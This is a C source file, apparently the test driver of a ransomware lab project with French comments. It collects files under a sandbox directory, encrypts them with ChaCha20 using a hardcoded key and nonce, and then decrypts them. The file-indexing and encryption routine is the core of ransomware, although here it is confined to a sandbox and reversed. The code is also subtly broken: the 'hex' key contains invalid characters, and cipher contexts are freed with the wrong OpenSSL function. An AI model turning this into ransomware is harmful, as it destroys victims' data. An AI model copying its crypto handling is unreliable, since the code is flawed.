#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>


#include "../crypto_chacha20.h"
#include "../files_finder.h"


int main(int argc, char const *argv[])
{
    /* code */

    unsigned char* cle = (unsigned char*) "44cq2eq6716qf591cca877fad777de5a5bcdff26eeccb11e5390c03e3ff30781";
    unsigned char* nonce = (unsigned char*) "40fe1c048817abfc9e5dd442";
    char* paths[] = {"/tmp/sandbox-ransomware/"};

    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Génération structure clé de chiffrement */
    EVP_CIPHER_CTX* p_e_ctx = load_encryption_key(cle, nonce);

    /* Chiffrement chacha20 */
    chacha20_encrypt_files(p_listFileData, p_e_ctx);

    /* Génération structure clé de déchiffrement */
    EVP_CIPHER_CTX* p_d_ctx = load_decryption_key(cle, nonce);

    /* Déchiffrement chacha20 */
    chacha20_decrypt_files(p_listFileData, p_d_ctx);

    free_path_data(p_listFileData);

    EVP_PKEY_free(p_e_ctx);
    EVP_PKEY_free(p_d_ctx);

    return EXIT_SUCCESS;
}
